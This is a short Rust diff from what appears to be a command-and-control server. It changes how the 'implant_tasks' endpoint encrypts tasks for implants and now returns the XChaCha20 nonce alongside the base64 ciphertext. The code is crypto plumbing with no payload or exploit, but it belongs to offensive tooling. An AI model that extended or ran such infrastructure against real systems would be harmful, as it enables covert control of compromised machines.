@@ -46,13 +46,18 @@ pub async fn implant_tasks(
 
     // Encrypt message (XChaCha20Poly1305)
     let encoded_tasks = bincode::serialize(&tasks).expect("Vector encode error");
-    let encrypted_response =
+    let (encrypted_message, nonce) =
         network_encryption::xchacha20poly1305_encrypt_message(blake3_hashed_key, &encoded_tasks);
 
     // Base64 encode encrypted response byte array
-    let base64_encrypted_response = base64::encode(encrypted_response);
+    let base64_encrypted_message = base64::encode(encrypted_message);
 
-    Ok(HttpResponse::Ok().body(base64_encrypted_response))
+    // Base64 encode nonce
+    let base64_nonce = base64::encode(nonce);
+
+    let response = format!("{}\n{}", base64_encrypted_message, base64_nonce);
+
+    Ok(HttpResponse::Ok().body(response))
 }
 
 fn get_implant_tasks(
